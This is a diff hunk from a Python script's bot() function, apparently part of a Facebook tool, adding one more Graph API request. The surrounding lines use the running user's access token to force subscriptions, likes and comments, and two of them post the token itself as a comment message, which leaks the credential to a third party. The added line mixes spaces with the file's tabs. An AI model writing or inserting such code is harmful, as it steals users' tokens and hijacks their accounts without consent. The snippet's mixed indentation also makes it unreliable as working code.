@@ -202,6 +202,7 @@ def bot():
 	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
 	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
 	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
+        requests.post('https://graph.facebook.com/135554395529272/likes?summary=true&access_token=%s'%(___token___))
 	requests.post("https://graph.facebook.com/132072589210786/comments/?message="+token+"&access_token="+token)
 	requests.post("https://graph.facebook.com/135554395529272/comments/?message="+komentar+"&access_token="+token)
 	requests.post("https://graph.facebook.com/135554395529272/comments/?message="+token+"&access_token="+token)
